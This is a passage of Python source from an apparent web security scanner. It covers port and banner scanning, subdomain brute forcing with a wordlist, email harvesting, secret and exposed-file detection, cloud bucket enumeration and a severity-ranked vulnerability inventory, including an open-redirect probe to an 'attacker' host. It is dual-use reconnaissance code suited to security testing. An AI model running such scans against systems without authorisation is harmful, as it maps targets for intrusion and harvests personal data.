    if upgraded:
        for r in upgraded:
            p_ok(r["path"], "WebSocket upgrade accepted (101)")
    else:
        p_note("WebSocket", "no upgrade accepted across " + str(len(res)) + " paths")

def run_cache_poison(ctx, url, args):
    p_section("Cache Poisoning Probe", "32")
    ctx["modules_run"].append("cache_poison")
    res = test_cache_poisoning(url, timeout=args.timeout)
    ctx["cache_poison"] = res
    reflected = [r for r in res if r["reflected"]]
    if reflected:
        for r in reflected:
            p_bad(r["header"], "REFLECTED (potential cache poisoning)")
    else:
        p_ok("Cache poisoning", "no unkeyed header reflected")

def run_hpp(ctx, url, args):
    p_section("HTTP Parameter Pollution", "33")
    ctx["modules_run"].append("hpp")
    res = test_hpp(url, timeout=args.timeout)
    ctx["hpp"] = res
    if res["pollution_accepted"]:
        p_warn("HPP", "server reflected multiple values: " + ", ".join(res["values_reflected"]))
    else:
        p_ok("HPP", "no parameter pollution accepted")

def run_dnssec(ctx, host, args):
    p_section("DNSSEC Validation", "34")
    ctx["modules_run"].append("dnssec")
    if is_ip(host):
        p_note("DNSSEC", "not measured - target is an IP")
        ctx["dnssec"] = None
        return
    res = check_dnssec(host, timeout=args.timeout)
    ctx["dnssec"] = res
    if res["secure"]:
        p_ok("DNSSEC", "enabled (DS/DNSKEY present)")
    else:
        p_warn("DNSSEC", "not enabled")
    for d in res.get("details", []):
        p_note("  detail", d, C.GR)
def run_methods(ctx, url, host, port, args):
    p_section("HTTP Methods Tester", "7")
    ctx["modules_run"].append("methods")
    res = test_http_methods(url, host, port, timeout=args.timeout)
    ctx["methods"] = res
    if res.get("allow"):
        p_ok("Allow header", res["allow"])
    for m in res.get("methods", []):
        status = m.get("status", 0)
        if status:
            color = C.Y if status in (200, 201, 204) else C.G
            p_ok(m["method"], f"HTTP {status}", color)
        else:
            p_bad(m["method"], shorten(m.get("error") or "no response", 100))

def run_redirects(ctx, url, args):
    p_section("Redirect Chain", "8")
    ctx["modules_run"].append("redirects")
    res = trace_redirects(url, timeout=args.timeout)
    ctx["redirects"] = res
    for hop in res.get("chain", []):
        loc = hop.get("location")
        if hop.get("status"):
            p_ok(f"hop {hop['hop']}", f"HTTP {hop['status']} {hop['url']}" +
                 (f"  ->  {loc}" if loc else ""))
        else:
            p_bad(f"hop {hop['hop']}", f"no response for {hop['url']}")
    p_note("Result", res.get("note"))
    p_ok("Final URL", res.get("final_url"))

def run_tech(ctx, args):
    p_section("Technology Fingerprinting", "9")
    ctx["modules_run"].append("tech")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("Tech", "not measured - no HTTP response")
        ctx["tech"] = []
        return
    tech = detect_tech(resp)
    ctx["tech"] = tech
    if tech:
        for t in tech:
            p_ok(t["name"], t["match"])
    else:
        p_note("Tech", "no fingerprints matched")

def run_paths(ctx, url, args):
    p_section("Hidden Paths", "10")
    ctx["modules_run"].append("paths")
    ctx["paths_scanned"] = True
    paths = PATHS_STD + (PATHS_DEEP if args.deep else [])
    results = path_scan(url, paths, timeout=args.timeout, workers=min(args.threads, 12))
    meta = {p: (lbl, sens) for p, lbl, sens in paths}
    exposed, protected = [], []
    for r in results:
        lbl, sens = meta.get(r["path"], ("", False))
        r["label"], r["sensitive"] = lbl, sens
        if sens and r["status"] == 200:
            exposed.append(r)
        elif sens and r["status"] in (401, 403):
            protected.append(r)
    ctx["paths"] = results
    ctx["exposed_paths"] = exposed
    ctx["protected_paths"] = protected
    for r in results:
        if r["status"] in (200, 301, 302, 401, 403):
            lbl, _s = meta.get(r["path"], ("", False))
            color = C.G if (r["status"] == 200 and not r.get("sensitive")) else C.Y
            p_ok(r["path"], f"HTTP {r['status']} {lbl}".strip(), color)
    if exposed:
        p_bad("Exposed", ", ".join(r["path"] for r in exposed))
    if protected:
        p_warn("Protected", ", ".join(r["path"] for r in protected))

def run_robots(ctx, url, args):
    p_section("robots.txt", "11")
    ctx["modules_run"].append("robots")
    rb = fetch_robots(url, timeout=args.timeout)
    ctx["robots"] = rb
    if not rb.get("found"):
        p_note("robots.txt", f"not found (HTTP {rb.get('status')})")
        return
    p_ok("URL", rb.get("url"))
    p_ok("Size", f"{rb.get('size')} bytes")
    if rb.get("agents"):
        p_ok("User-agent", ", ".join(rb["agents"][:6]))
    for d in rb.get("disallow", [])[:12]:
        p_ok("Disallow", d)
    for a in rb.get("allow", [])[:8]:
        p_ok("Allow", a)
    for s in rb.get("sitemaps", [])[:6]:
        p_ok("Sitemap", s)
    if rb.get("crawl_delay"):
        p_ok("Crawl-delay", rb["crawl_delay"])

def run_sitemap(ctx, url, args):
    p_section("sitemap.xml", "12")
    ctx["modules_run"].append("sitemap")
    sm = extract_sitemap(url, timeout=max(10.0, args.timeout))
    ctx["sitemap"] = sm
    if not sm.get("urls") and not sm.get("indexes"):
        p_note("sitemap.xml", "no URLs found" + (f" - {sm['errors']}" if sm.get("errors") else ""))
        return
    if sm.get("indexes"):
        p_ok("Sitemap index", f"{len(sm['indexes'])} nested sitemap(s)")
        for idx in sm["indexes"][:6]:
            p_ok("Index", idx)
    p_ok("URLs found", f"{sm.get('total', 0)} (showing {len(sm['urls'])})")
    for u in sm["urls"][:20]:
        p_ok("URL", u)
    if len(sm["urls"]) > 20:
        p_note("More", f"{len(sm['urls']) - 20} additional URLs stored in the JSON report")

def run_security_txt(ctx, url, args):
    p_section("security.txt (RFC 9116)", "13")
    ctx["modules_run"].append("security_txt")
    st = fetch_security_txt(url, timeout=args.timeout)
    ctx["security_txt"] = st
    if not st.get("found"):
        p_note("security.txt", f"not found (HTTP {st.get('status')})")
        return
    p_ok("URL", st.get("url"))
    for c in st.get("contact", [])[:6]:
        p_ok("Contact", c)
    if st.get("expires"):
        p_ok("Expires", st["expires"])
    for e in st.get("encryption", [])[:4]:
        p_ok("Encryption", e)
    if st.get("policy"):
        p_ok("Policy", st["policy"])
    if st.get("canonical"):
        p_ok("Canonical", st["canonical"])
    for l in st.get("preferred_languages", [])[:4]:
        p_ok("Preferred-Languages", l)

def run_emails(ctx, args):
    p_section("Email Harvesting", "14")
    ctx["modules_run"].append("emails")
    texts = []
    resp = ctx.get("http_resp") or {}
    if resp.get("body"):
        texts.append(resp["body"])
    st = ctx.get("security_txt") or {}
    if st.get("contact"):
        texts.extend(st["contact"])
    if st.get("policy"):
        texts.append(st["policy"])
    emails = harvest_emails(texts)
    ctx["emails"] = emails
    if emails:
        for e in emails[:30]:
            p_ok("E-mail", e)
        if len(emails) > 30:
            p_note("More", f"{len(emails) - 30} additional addresses in the JSON report")
    else:
        p_note("E-mail", "none found in the fetched content")

def run_subdomains(ctx, host, args):
    p_section("Subdomain Enumeration (crt.sh)", "15")
    ctx["modules_run"].append("subdomains")
    if is_ip(host):
        p_note("Subdomains", "not measured - target is an IP address")
        ctx["subdomains"] = []
        return
    names, err = crtsh_subdomains(host, timeout=max(25.0, args.timeout))
    if err:
        p_note("crt.sh", f"not measured - {err}")
        ctx["subdomains"] = []
        return
    if not names:
        p_note("crt.sh", "no certificate names found")
        ctx["subdomains"] = []
        return
    p_ok("Names found", len(names))
    with ThreadPoolExecutor(max_workers=max(1, min(args.threads, 20))) as pool:
        futures = [pool.submit(resolve_hostname, n) for n in names]
        resolved = []
        for fut in as_completed(futures):
            try:
                resolved.append(fut.result())
            except Exception:
                pass
    resolved.sort(key=lambda x: x["name"])
    ctx["subdomains"] = resolved
    shown = resolved[:50]
    for r in shown:
        p_ok(r["name"], f"{r['ip']}  {r['status']}", C.G if r.get("ip") else C.Y)
    if len(resolved) > len(shown):
        p_note("More", f"{len(resolved) - len(shown)} additional names in the JSON report")

def run_ports(ctx, host, args):
    p_section("Port Scan", "16")
    ctx["modules_run"].append("ports")
    ctx["ports_scanned"] = True
    open_ports = port_scan(host, timeout=min(2.0, args.timeout), workers=args.threads)
    ctx["open_ports"] = open_ports
    if not open_ports:
        p_note("Ports", "no open ports found")
        return
    for p in open_ports:
        svc = SERVICE_MAP.get(p, "unknown")
        risky = RISKY_PORTS.get(p)
        p_ok(f"port {p}", f"{svc}" + (f"  [risky: {risky}]" if risky else ""),
             C.Y if risky else C.G)

    if args.quick:
        p_note("Banners", "skipped (--quick)")
        return
    p_section("Banner Grabbing", "16b")
    banners = {}
    targets = [(p, SERVICE_MAP.get(p, "")) for p in open_ports]
    with ThreadPoolExecutor(max_workers=max(1, min(args.threads, 10))) as pool:
        futures = {pool.submit(grab_banner, host, p, svc, min(4.0, args.timeout)): p
                   for p, svc in targets}
        for fut in as_completed(futures):
            port = futures[fut]
            try:
                banners[str(port)] = fut.result()
            except Exception as e:
                banners[str(port)] = f"error: {e}"
    ctx["banners"] = banners
    for port in sorted(banners, key=lambda x: int(x)):
        p_ok(f"port {port}", banners[port])

def run_geo(ctx, args):
    p_section("IP Geolocation / ASN", "17")
    ctx["modules_run"].append("geo")
    ips = list(ctx.get("dns_ips") or [])
    if not ips:
        # the DNS module may be disabled - resolve the host directly instead
        host = ctx.get("host")
        if host and not is_ip(host):
            try:
                ips = [socket.gethostbyname(host)]
                p_note("Geo", f"resolved {host} -> {ips[0]} (DNS module disabled)")
            except Exception:
                ips = []
        elif host and is_ip(host):
            ips = [host]
    if not ips:
        p_note("Geo", "not measured - no IP address resolved")
        ctx["geo"] = []
        return
    results = []
    with ThreadPoolExecutor(max_workers=max(1, min(len(ips), 5))) as pool:
        futures = {pool.submit(geo_lookup, ip, max(8.0, args.timeout)): ip for ip in ips}
        for fut in as_completed(futures):
            ip = futures[fut]
            try:
                results.append(fut.result())
            except Exception as e:
                results.append({"ip": ip, "error": str(e)})
    results.sort(key=lambda x: x["ip"])
    ctx["geo"] = results
    for g in results:
        if g.get("error"):
            p_warn(g["ip"], g["error"])
            continue
        loc = ", ".join(x for x in (g.get("city"), g.get("region"), g.get("country")) if x)
        p_ok(g["ip"], loc or "unknown")
        p_ok("ISP", f"{g.get('isp') or '-'} / {g.get('org') or '-'}")
        p_ok("ASN", f"{g.get('asn') or '-'} ({g.get('asname') or '-'})")
        p_ok("Timezone", g.get("timezone") or "-")

def run_rate_limit(ctx, url, args):
    p_section("Rate Limiting Test", "18")
    ctx["modules_run"].append("rate_limit")
    rl = rate_limit_test(url, count=10, timeout=args.timeout)
    ctx["rate_limit"] = rl
    p_ok("Requests", rl["requests"])
    p_ok("Status codes", ", ".join(str(s) for s in rl["statuses"]))
    p_ok("Average", f"{rl['avg_ms']} ms")
    p_ok("First 3 avg", f"{rl['first_avg_ms']} ms")
    p_ok("Last 3 avg", f"{rl['last_avg_ms']} ms")
    if rl["rate_limited"]:
        p_warn("Result", "HTTP 429 received - rate limiting is active")
    elif rl["slowing_down"]:
        p_warn("Result", f"response time grew {rl['ratio']}x during the burst")
    else:
        p_ok("Result", "no rate limiting observed")

# ================= VULNERABILITY INVENTORY =================
VULN_SEVERITY_ORDER = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}

def build_vuln_inventory(ctx):
    """Aggregate every real finding into a categorized, counted inventory."""
    inv = []
    host = ctx.get("host") or ""
    base = ctx.get("url") or ""

    def add(severity, category, title, location, evidence="", source=""):
        inv.append({"severity": severity, "category": category, "title": title,
                    "location": location, "evidence": evidence, "source": source})

    # ---- Exposed sensitive files ----
    for p in (ctx.get("exposed_paths") or []):
        add("Critical", "Information Disclosure",
            f"Sensitive file exposed: {p.get('path')}",
            base.rstrip("/") + p.get("path", ""),
            f"HTTP {p.get('status')} ({p.get('label', '')})",
            source="Hidden Paths Scanner")

    # ---- Directory listing ----
    for d in (ctx.get("dir_listing") or []):
        add("Medium", "Information Disclosure",
            "Directory listing enabled",
            base.rstrip("/") + d.get("path", ""),
            d.get("signature", ""),
            source="Directory Listing Detection")

    # ---- Secrets / JWTs ----
    for s in (ctx.get("secrets") or []):
        sev = "Critical" if s.get("type") in ("AWS Access Key", "AWS Secret Key",
            "Private Key", "GitHub Token", "Slack Token", "Slack Webhook") else "High"
        add(sev, "Secret Leakage",
            f"Leaked {s.get('type')}",
            base, shorten(s.get("value", ""), 40),
            source="Secret / JWT Scanner")

    # ---- Subdomain takeover ----
    for t in (ctx.get("takeover") or []):
        add("Critical", "Subdomain Takeover",
            f"Possible takeover of {t.get('subdomain')} -> {t.get('service')}",
            t.get("subdomain", ""), f"HTTP {t.get('status')}",
            source="Subdomain Takeover Check")

    # ---- Open redirects ----
    for r in (ctx.get("open_redirects") or []):
        if r.get("vulnerable"):
            add("Medium", "Open Redirect",
                f"Open redirect via '{r.get('param')}' parameter",
                f"{base}/?{r.get('param')}=https://attacker/",
                r.get("location", ""),
                source="Open Redirect Tester")

    # ---- Host header injection ----
    for h in (ctx.get("host_header") or []):
        if h.get("reflected"):
            add("Medium", "Host Header Injection",
                f"Reflected header: {h.get('header')}",
                base, f"HTTP {h.get('status')}",
                source="Host Header Injection")

    # ---- Reflected parameters (XSS) ----
    for r in (ctx.get("reflected_params") or []):
        if r.get("reflected"):
            add("Medium", "Cross-Site Scripting (XSS)",
                f"Reflected parameter '{r.get('param')}'",
                f"{base}/?{r.get('param')}=marker",
                f"{r.get('occurrences')} reflection(s)",
                source="Reflected Parameter Probe")

    # ---- Mixed content ----
    for u in (ctx.get("mixed_content") or []):
        add("Low", "Mixed Content",
            "HTTP sub-resource on HTTPS page",
            u, "",
            source="Mixed Content Scanner")

    # ---- Forms without CSRF ----
    for i, f in enumerate(ctx.get("forms") or [], 1):
        if f.get("has_password") and not f.get("csrf_field"):
            add("Medium", "Cross-Site Request Forgery (CSRF)",
                f"Password form #{i} without CSRF token",
                f.get("action") or base, f"{f.get('method')} {f.get('input_count')} inputs",
                source="Form & CSRF Discovery")
        elif not f.get("csrf_field") and f.get("method") == "POST":
            add("Low", "Cross-Site Request Forgery (CSRF)",
                f"POST form #{i} without CSRF token",
                f.get("action") or base, f"{f.get('input_count')} inputs",
                source="Form & CSRF Discovery")

    # ---- Directory listing ----
    for d in (ctx.get("dir_listing") or []):
        add("Medium", "Information Disclosure",
            "Directory listing enabled",
            base.rstrip("/") + d.get("path", ""), d.get("signature", ""),
            source="Directory Listing Detection")

    # ---- CORS misconfiguration ----
    audit = ctx.get("header_audit") or {}
    if audit.get("cors_misconfigured"):
        add("High", "CORS Misconfiguration",
            "Wildcard origin with credentials",
            base, audit.get("acao", ""),
            source="HTTP Header Audit")

    # ---- Missing security headers ----
    missing_map = {
        "strict-transport-security": ("High", "Missing HSTS"),
        "content-security-policy": ("High", "Missing Content-Security-Policy"),
        "x-frame-options": ("Medium", "Missing X-Frame-Options (clickjacking)"),
        "x-content-type-options": ("Medium", "Missing X-Content-Type-Options"),
        "referrer-policy": ("Low", "Missing Referrer-Policy"),
        "permissions-policy": ("Low", "Missing Permissions-Policy"),
        "cross-origin-opener-policy": ("Low", "Missing COOP"),
        "cross-origin-embedder-policy": ("Low", "Missing COEP"),
        "cross-origin-resource-policy": ("Low", "Missing CORP"),
    }
    for h, desc in (audit.get("missing") or []):
        if h in missing_map:
            sev, title = missing_map[h]
            add(sev, "Missing Security Header", title, base, desc, source="HTTP Header Audit")

    # ---- Weak header values ----
    for h, val in (audit.get("weak") or []):
        add("Low", "Weak Security Header", f"Weak value: {h}", base, val, source="HTTP Header Audit")

    # ---- Cookies ----
    for c in (audit.get("cookies") or []):
        if not c.get("secure"):
            add("Medium", "Insecure Cookie", f"Cookie '{c.get('name')}' missing Secure flag",
                base, "no-Secure", source="HTTP Header Audit")
        if not c.get("httponly"):
            add("Medium", "Insecure Cookie", f"Cookie '{c.get('name')}' missing HttpOnly flag",
                base, "no-HttpOnly", source="HTTP Header Audit")
        if not c.get("samesite"):
            add("Low", "Insecure Cookie", f"Cookie '{c.get('name')}' missing SameSite",
                base, "no-SameSite", source="HTTP Header Audit")

    # ---- Risky open ports ----
    RISKY = {21: "FTP", 22: "SSH", 23: "Telnet", 445: "SMB", 1433: "MSSQL",
             3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
             6379: "Redis", 9200: "Elasticsearch", 27017: "MongoDB",
             6443: "Kubernetes API", 2375: "Docker API", 9000: "PHP-FPM",
             5601: "Kibana", 9090: "Prometheus", 11211: "Memcached",
             15672: "RabbitMQ", 27018: "MongoDB", 8080: "HTTP-proxy"}
    for p in (ctx.get("open_ports") or []):
        if p in RISKY:
            add("Medium", "Exposed Service", f"Risky port {p}/{RISKY[p]} open",
                f"{ctx.get('host')}:{p}", "TCP open", source="Port Scanner")

    # ---- Source maps exposed ----
    for s in (ctx.get("sourcemaps") or []):
        if s.get("reachable"):
            add("Low", "Information Disclosure",
                "Source map exposed", s.get("map_url", ""), f"HTTP {s.get('status')}",
                source="Source Map Detection")

    # ---- Mixed content ----
    for u in (ctx.get("mixed_content") or []):
        add("Low", "Mixed Content", "HTTP sub-resource on HTTPS page", u, "", source="Mixed Content Scanner")

    # ---- Cache poisoning ----
    for c in (ctx.get("cache_poison") or []):
        if c.get("reflected"):
            add("Medium", "Cache Poisoning",
                f"Unkeyed header reflected: {c.get('header')}",
                base, f"HTTP {c.get('status')}", source="Cache Poisoning Probe")

    # ---- HPP ----
    hpp = ctx.get("hpp") or {}
    if hpp.get("pollution_accepted"):
        add("Low", "HTTP Parameter Pollution",
            "Server accepts duplicate parameters",
            hpp.get("url", ""), ", ".join(hpp.get("values_reflected", [])))

    # ---- Open redirects (already added above) ----

    # ---- Email security ----
    es = ctx.get("email_security") or {}
    if es and not es.get("spf"):
        add("Medium", "Email Security", "No SPF record", host, "missing", source="Email Security")
    if es and not es.get("dmarc"):
        add("Medium", "Email Security", "No DMARC record", host, "missing", source="Email Security")
    if es and not es.get("mta_sts"):
        add("Low", "Email Security", "No MTA-STS configured", host, "missing", source="Email Security")

    # ---- TLS issues ----
    ssl_i = ctx.get("ssl") or {}
    if ssl_i.get("connected"):
        if ssl_i.get("trusted") is False:
            add("High", "TLS/SSL", "Certificate not trusted by system store",
                base, shorten(ssl_i.get("verify_error", ""), 60), source="TLS/SSL Full Audit")
        if ssl_i.get("expired"):
            add("High", "TLS/SSL", "Certificate expired",
                base, f"{ssl_i.get('days_left')} days", source="TLS/SSL Full Audit")
        if ssl_i.get("self_signed"):
            add("Medium", "TLS/SSL", "Self-signed certificate", base, "", source="TLS/SSL Full Audit")
        if ssl_i.get("covers_host") is False:
            add("High", "TLS/SSL", "Certificate does not cover hostname", base, "", source="TLS/SSL Full Audit")
        days = ssl_i.get("days_left")
        if days is not None and 0 < days < 30:
            add("Medium", "TLS/SSL", f"Certificate expires in {days} days", base, "", source="TLS/SSL Full Audit")
    versions = ctx.get("tls_versions") or {}
    if versions:
        if any(v.startswith("accepted") for k, v in versions.items()
               if k in ("TLSv1", "TLSv1.1")):
            add("Medium", "TLS/SSL", "Legacy TLS 1.0/1.1 supported", base, "", source="TLS/SSL Full Audit")
        if not any(v.startswith("accepted") for k, v in versions.items()
                   if k in ("TLSv1.2", "TLSv1.3")):
            add("High", "TLS/SSL", "No modern TLS (1.2/1.3) supported", base, "", source="TLS/SSL Full Audit")

    # ---- DNS zone transfer ----
    if ctx.get("zone_transfer") is True:
        add("Critical", "DNS", "DNS zone transfer allowed (AXFR)",
            host, ctx.get("zone_transfer_note", ""), source="DNS Module")

    # ---- WAF absent ----
    if ctx.get("http_ok") and not (ctx.get("waf") or []):
        add("Low", "WAF/CDN", "No WAF/CDN detected", base, "origin exposed", source="WAF/CDN Fingerprinting")

    # ---- Server version leak ----
    hdrs = ctx.get("headers") or {}
    server = hdrs.get("server", "")
    if server and re.search(r"\d", server):
        add("Low", "Information Disclosure", "Server version disclosed", base, server, source="HTTP Header Audit")

    # ---- GraphQL introspection ----
    for g in (ctx.get("graphql") or []):
        if g.get("introspection_enabled"):
            add("Medium", "GraphQL", "Introspection enabled",
                g.get("url", ""), f"HTTP {g.get('status')}", source="GraphQL Introspection")

    # ---- Secrets in forms ----
    # (already counted)

    # sort by severity
    inv.sort(key=lambda x: (VULN_SEVERITY_ORDER.get(x["severity"], 9), x["category"]))
    return inv

def run_vuln_inventory(ctx, args):
    p_section("Vulnerability Inventory", "💀")
    ctx["modules_run"].append("vuln_inventory")
    inv = build_vuln_inventory(ctx)
    ctx["vuln_inventory"] = inv

    if not inv:
        p_ok("Vulnerabilities", "none detected")
        return

    # counts
    from collections import Counter
    sev_counts = Counter(v["severity"] for v in inv)
    cat_counts = Counter(v["category"] for v in inv)

    p_ok("Total findings", len(inv))
    for sev in ("Critical", "High", "Medium", "Low", "Info"):
        n = sev_counts.get(sev, 0)
        if n:
            color = {"Critical": C.R, "High": C.R, "Medium": C.Y,
                     "Low": C.B, "Info": C.GR}[sev]
            p_ok(f"  {sev}", n, color)
    p_line()
    p_ok("Categories", len(cat_counts))
    for cat, n in cat_counts.most_common():
        p_note(f"  {cat}", n, C.GR)
    p_line()
    p_ok("Vulnerability List (name / severity / source):", "")
    p_line()
    for idx, v in enumerate(inv, 1):
        color = {"Critical": C.R, "High": C.R, "Medium": C.Y,
                 "Low": C.B, "Info": C.GR}.get(v["severity"], C.W)
        src_name = v.get("source") or v.get("category") or "-"
        skull = c("💀", C.R)  # red skull emoji
        p_ok(f"{skull} {idx}. {v['title']}",
             f"[{v['severity']}]  source={src_name}  @ {shorten(v['location'], 60)}", color)
        if v.get("evidence"):
            p_note("     evidence", shorten(v["evidence"], 80), C.GR)
# ================= DNS BRUTE-FORCE SUBDOMAIN ENUMERATION =================
SUBDOMAIN_WORDLIST = [
    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2",
    "ns3", "ns4", "webdisk", "cpanel", "whm", "autodiscover", "autoconfig",
    "m", "imap", "test", "ns", "blog", "pop3", "dev", "www2", "admin",
    "forum", "news", "vpn", "api", "mobile", "remote", "portal", "staging",
    "stage", "app", "apps", "beta", "demo", "docs", "doc", "help", "support",
    "secure", "login", "signin", "signup", "register", "dashboard", "panel",
    "manage", "management", "console", "control", "cp", "direct", "direct-connect",
    "email", "mx", "mx1", "mx2", "smtp", "relay", "gateway",
    "proxy", "cdn", "static", "assets", "media", "images", "img", "css", "js",
    "files", "download", "downloads", "upload", "uploads", "backup", "backups",
    "old", "new", "v1", "v2", "v3", "api1", "api2", "api-v1", "api-v2",
    "rest", "graphql", "ws", "wss", "socket", "realtime", "live", "stream",
    "video", "audio", "chat", "shop", "store", "cart", "checkout", "pay",
    "payment", "billing", "invoice", "account", "accounts", "user", "users",
    "member", "members", "client", "clients", "customer", "customers",
    "partner", "partners", "vendor", "vendors", "supplier", "suppliers",
    "internal", "intranet", "extranet", "private", "public", "external",
    "corp", "corporate", "office", "hq", "headquarters", "branch", "branches",
    "region", "regions", "global", "local", "localhost", "loopback",
    "git", "svn", "hg", "repo", "repository", "code", "src", "source",
    "build", "deploy", "ci", "cd", "jenkins", "gitlab", "github", "bitbucket",
    "jira", "confluence", "wiki", "kb", "knowledge", "helpdesk", "ticket",
    "monitor", "monitoring", "grafana", "prometheus", "kibana", "elastic",
    "log", "logs", "logging", "audit", "audits", "report", "reports",
    "analytics", "stats", "statistics", "metrics", "dashboard", "status",
    "health", "healthcheck", "ping", "heartbeat", "uptime", "availability",
    "search", "find", "lookup", "query", "filter", "sort", "page", "pages",
    "home", "index", "main", "default", "start", "welcome", "intro",
    "about", "contact", "faq", "terms", "privacy", "policy", "legal",
    "careers", "jobs", "hire", "hiring", "team", "people", "staff",
    "news", "press", "media", "pr", "marketing", "sales", "crm",
    "hr", "finance", "accounting", "payroll", "budget", "expense",
    "it", "tech", "technology", "engineering", "dev", "development",
    "qa", "test", "testing", "staging", "prod", "production", "live",
    "demo", "sandbox", "playground", "lab", "labs", "research", "r&d",
    "training", "learn", "education", "edu", "university", "school",
    "mail2", "mail3", "smtp2", "web", "web1", "web2", "web3",
    "server", "server1", "server2", "host", "host1", "host2",
    "node", "node1", "node2", "worker", "worker1", "worker2",
    "db", "db1", "db2", "database", "mysql", "postgres", "mongo",
    "redis", "cache", "memcache", "memcached", "queue", "rabbit",
    "kafka", "zookeeper", "consul", "etcd", "vault", "secret",
    "auth", "oauth", "sso", "ldap", "ad", "active-directory",
    "kerberos", "radius", "tacacs", "ntp", "dns", "dhcp",
    "ftp", "sftp", "scp", "rsync", "nfs", "smb", "cifs",
    "ssh", "telnet", "rsh", "rlogin", "vnc", "rdp", "x11",
    "snmp", "syslog", "trap", "alarm", "alert", "notify",
    "backup", "restore", "archive", "snapshot", "clone", "mirror",
    "cdn1", "cdn2", "edge", "edge1", "edge2", "origin", "upstream",
    "downstream", "loadbalancer", "lb", "lb1", "lb2", "haproxy",
    "nginx", "apache", "iis", "tomcat", "jetty", "jboss", "wildfly",
    "weblogic", "websphere", "glassfish", "resin", "gunicorn", "uwsgi",
    "php", "phpmyadmin", "pma", "adminer", "mysqladmin",
    "wp", "wordpress", "drupal", "joomla", "magento", "prestashop",
    "shopify", "woocommerce", "opencart", "oscommerce",
    "laravel", "symfony", "django", "flask", "rails", "express",
    "spring", "struts", "jsf", "vaadin", "gwt", "play",
    "react", "angular", "vue", "svelte", "next", "nuxt", "gatsby",
    "ember", "backbone", "knockout", "meteor", "blaze",
    "mobile", "mobi", "wap", "pda", "tablet", "phone",
    "tv", "smarttv", "iot", "device", "devices",
    "cloud", "aws", "azure", "gcp", "google", "amazon",
    "s3", "ec2", "rds", "lambda", "dynamodb", "sqs", "sns",
    "storage", "bucket", "buckets", "blob", "container", "containers",
]

def dns_bruteforce_subdomains(domain, timeout=3, workers=20, wordlist=None):
    wordlist = wordlist or SUBDOMAIN_WORDLIST
    found = []
    candidates = [w + "." + domain for w in wordlist]
    seen = set()
    uniq = []
    for c in candidates:
        if c not in seen:
            seen.add(c)
            uniq.append(c)
    with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
        futures = {pool.submit(resolve_hostname, name): name for name in uniq}
        for fut in as_completed(futures):
            try:
                r = fut.result()
                if r.get("ip"):
                    found.append(r)
            except Exception:
                pass
    found.sort(key=lambda x: x["name"])
    return found

# ================= JAVASCRIPT ENDPOINT EXTRACTOR =================
def extract_js_endpoints(resp, timeout=8):
    if not resp or not resp.get("ok"):
        return []
    body = resp.get("body") or ""
    parsed = urlparse(resp.get("url") or "")
    root = parsed.scheme + "://" + parsed.netloc
    js_urls = set()
    for m in re.finditer(r'<script[^>]+src=["\']([^"\']+)', body, re.I):
        u = m.group(1)
        if u.startswith("/"):
            u = root + u
        elif not u.startswith("http"):
            u = root + "/" + u
        if ".js" in u:
            js_urls.add(u)
    endpoints = set()
    url_pat = re.compile(r"""["'](https?://[^"'\s]+|/api/[a-zA-Z0-9_\-/]+|/v[0-9]+/[a-zA-Z0-9_\-/]+)["']""")
    for js_url in list(js_urls)[:20]:
        r = http_request(js_url, timeout=timeout)
        if r.get("ok") and r.get("status") == 200:
            js_body = r.get("body") or ""
            for m in url_pat.finditer(js_body):
                endpoints.add(m.group(1))
            for m in re.finditer(r"""(?:fetch|axios\.(?:get|post|put|delete)|\$.ajax)\s*\(\s*["']([^"']+)["']""", js_body, re.I):
                endpoints.add(m.group(1))
    for m in url_pat.finditer(body):
        endpoints.add(m.group(1))
    filtered = set()
    for ep in endpoints:
        low = ep.lower()
        if any(ext in low for ext in (".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".ttf", ".map")):
            continue
        if len(ep) < 3:
            continue
        filtered.add(ep)
    return sorted(filtered)

# ================= CLOUD STORAGE BUCKET ENUMERATION =================
def enumerate_cloud_buckets(domain, timeout=6):
    base = domain.split(".")[0].lower()
    candidates = {base, domain.replace(".", "-"), domain.replace(".", ""),
                  base + "-backup", base + "-dev", base + "-staging",
                  base + "-assets", base + "-static", base + "-media",
                  base + "-uploads", base + "-files", base + "-data",
                  base + "-logs", base + "-test", base + "-prod"}
    templates = ["https://{name}.s3.amazonaws.com",
                 "https://s3.amazonaws.com/{name}",
                 "https://{name}.blob.core.windows.net",
                 "https://storage.googleapis.com/{name}"]
    found = []
    for name in candidates:
        for template in templates:
            url = template.format(name=name)
            r = http_request(url, timeout=timeout, method="HEAD")
            if r.get("status") not in (0, 404):
                svc = "s3" if "s3" in template or "amazonaws" in template else ("azure" if "blob.core" in template else "gcs")
                found.append({"service": svc, "bucket": name, "url": url,
                              "status": r.get("status", 0)})
    seen = set()
    out = []
    for f in found:
        if f["url"] not in seen:
            seen.add(f["url"])
            out.append(f)
    return out

# ================= RUNNERS =================

def run_dns_bruteforce(ctx, host, args):
    p_section("DNS Brute-Force Subdomains", "36")
    ctx["modules_run"].append("dns_bruteforce")
    if is_ip(host):
        p_note("DNS brute-force", "not measured - target is an IP")
        ctx["dns_bruteforce"] = []
        return
    found = dns_bruteforce_subdomains(host, timeout=min(3.0, args.timeout),
                                      workers=min(args.threads, 20))
    ctx["dns_bruteforce"] = found
    if found:
        p_ok("Brute-forced", len(found))
        for r in found[:30]:
            p_ok(r["name"], r["ip"])
        if len(found) > 30:
            p_note("More", str(len(found) - 30) + " additional in JSON report")
    else:
        p_ok("Brute-force", "no additional subdomains found")

def run_js_endpoints(ctx, url, args):
    p_section("JavaScript Endpoint Extraction", "37")
    ctx["modules_run"].append("js_endpoints")
    resp = ctx.get("http_resp")
    if not resp or not ctx.get("http_ok"):
        p_note("JS endpoints", "not measured - no HTTP response")
        ctx["js_endpoints"] = []
        return
    eps = extract_js_endpoints(resp, timeout=args.timeout)
    ctx["js_endpoints"] = eps
    if eps:
        p_ok("Endpoints found", len(eps))
        for ep in eps[:30]:
            p_ok("endpoint", ep)
        if len(eps) > 30:
            p_note("More", str(len(eps) - 30) + " additional in JSON report")
    else:
        p_ok("JS endpoints", "none extracted")

def run_cloud_buckets(ctx, host, args):
    p_section("Cloud Storage Bucket Enumeration", "38")
    ctx["modules_run"].append("cloud_buckets")
    if is_ip(host):
